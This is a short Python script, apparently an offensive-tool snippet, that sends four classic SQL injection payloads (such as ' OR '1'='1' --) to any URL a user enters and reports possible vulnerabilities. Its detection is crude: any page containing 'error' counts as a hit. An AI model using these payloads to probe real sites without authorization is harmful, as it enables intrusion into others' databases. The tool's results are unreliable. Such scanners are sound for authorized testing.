import requests

def sql_injection_scanner(target_url):
    """[Scan for SQL injection vulnerabilities by testing common payloads]"""
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' AND '1'='1'"]
    
    for payload in payloads:
        url = f"{target_url}?id={payload}"
        try:
            response = requests.get(url)
            if "SQL syntax" in response.text or "error" in response.text.lower():
                print(f"Possible SQL Injection vulnerability found at: {url}")
            else:
                print(f"No vulnerability found with payload at: {url}")
        except requests.exceptions.RequestException as e:
            print(f"Error accessing {url}: {e}")

# User input
target_url = input("\033[91mint4 [Enter the Target URL] > \033[0m")
if target_url.startswith("http://") or target_url.startswith("https://"):
    sql_injection_scanner(target_url)
else:
    print("Please enter a valid URL starting with http:// or https://")